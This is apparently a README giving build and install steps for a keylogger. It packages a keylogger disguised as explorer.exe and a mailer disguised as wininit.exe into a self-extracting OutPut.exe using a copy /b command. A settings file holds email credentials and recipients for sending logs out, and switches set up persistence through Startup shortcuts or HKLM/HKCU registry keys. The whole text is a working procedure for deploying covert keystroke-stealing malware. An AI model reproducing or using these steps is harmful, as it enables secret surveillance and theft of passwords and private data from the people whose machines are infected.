Instructions to Build Installer
==================================

1. Zip the content containing all files with 7 zip package.7z
	- Keylogger binary - explorer.exe
	- Send Mail binary - wininit.exe
	- settings.txt CSV - LogDir, CompName, sendTo, sendFrom, Password, RetryTime, PubIPURL
	- titles.txt (Optional) - Window titles at each line. If exists, keylogger will record keystrokes under those titles only

2. Optionally modify config.txt, It must be saved in UTF-8 Encoding. Ensure right bottom corner of Notepad++ shows **UTF-8-BOM**

3. in cmd type

	copy /b 7zsd.sfx+config.txt+package.7z OutPut.exe

4. Use OutPut.exe to Install KLG.

---------------------------------------------------------------
You can use use cmd switch of OutPut.exe to control type of installation
---------------------------------------------------------------
OutPut.exe	Default..AU
OutPut.exe -ai0	All Users Startup Shortcut(AU)
OutPut.exe -ai1	Users Startup Shortcut
OutPut.exe -ai2	HKLM
OutPut.exe -ai3	HKCU

Note that you must have administrative rights to perform -ai0 or -ai2